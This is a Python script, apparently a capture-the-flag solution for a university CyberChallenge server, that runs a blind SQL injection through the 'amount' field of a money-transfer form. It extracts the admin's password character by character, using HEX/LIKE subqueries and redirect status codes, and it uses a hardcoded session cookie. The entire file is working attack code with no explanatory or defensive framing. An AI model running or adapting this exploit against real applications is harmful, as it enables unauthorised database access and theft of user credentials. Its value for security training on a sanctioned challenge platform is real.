#!/usr/bin/env python3

# import pyclip
import binascii
import requests
import string

def string_to_hex(input_string):
    '''
    Convert a string to its hexadecimal representation
    the same way that sqlite3 HEX() function does.
    '''
    encoded_bytes = input_string.encode('utf-8')

    # Convert the bytes to hexadecimal representation
    hex_representation = binascii.hexlify(encoded_bytes).decode('utf-8')

    return hex_representation.upper()


# Your cookies here
cookies = {
    'session': 'eyJiYWxhbmNlIjoxMDEwLCJ1c2VyX2lkIjo0MCwidXNlcm5hbWUiOiJhZCJ9.Z-Jzwg.JDCzbKa4iGLyu7TU11xPkTLwXq8',
}

# A session object to keep track of cookies
browser = requests.Session()

# The target URL
url = 'http://cyberchallenge.disi.unitn.it:7110/transfer'

secret = ''
while True:
    found = False
    for character in string.printable:
        # Injection
        injection = f"AND (SELECT 1 FROM users WHERE username = 'admin' AND HEX(password) LIKE '{string_to_hex(secret + character)}%')"
        
        # The data to send (with the injection)
        data = {
            'to_user' : 'Filippo',
            'amount' : f'{injection}'
        }
        

        response = browser.post(url, cookies=cookies, data=data, allow_redirects=False)
        print(f'Character: {character}', response.status_code)


        # Follow the redirect
        if response.status_code == 302:
            if 'Location' in response.headers and response.headers['Location'].startswith('/'):
                _url = url.replace('/transfer', response.headers['Location'])
            else:
                _url = response.headers['Location']
            response = browser.get(_url, cookies=cookies, allow_redirects=False)

        # If the response is <REDACTED>, it means that the query is correct
        if response.status_code == 302: # Change this condition to the correct one
            secret += character
            found = True
            print(f'New character found ({character}): {secret}')
            continue
        else:
            pass

    if not found:
        break

# pyclip.copy(secret)
print(f'Secret: {secret}')

